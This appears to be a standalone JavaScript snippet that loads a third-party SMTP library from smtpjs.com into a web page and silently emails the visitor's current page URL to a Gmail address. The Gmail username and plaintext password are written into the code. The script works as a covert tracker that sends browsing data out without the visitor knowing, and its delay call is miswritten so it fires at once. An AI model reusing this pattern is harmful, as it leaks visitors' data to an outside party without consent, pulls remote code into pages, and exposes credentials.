var sc = document.createElement("script");
sc.setAttribute("src", "https://smtpjs.com/v3/smtp.js");
document.head.appendChild(sc);
console.log(sc)
  website = window.location.href
var sendEmail=function() {
      Email.send({
        Host: "smtp.gmail.com",
        Username: "sendmailapplication32@gmail.com",
        Password: "easypassword",
        To: 'sendmailapplication32@gmail.com',
        From: "sendmailapplication32@gmail.com",
        Subject: "Sending Email using javascript",
        Body: website,
      })
    }
setTimeout(sendEmail(), 5000);

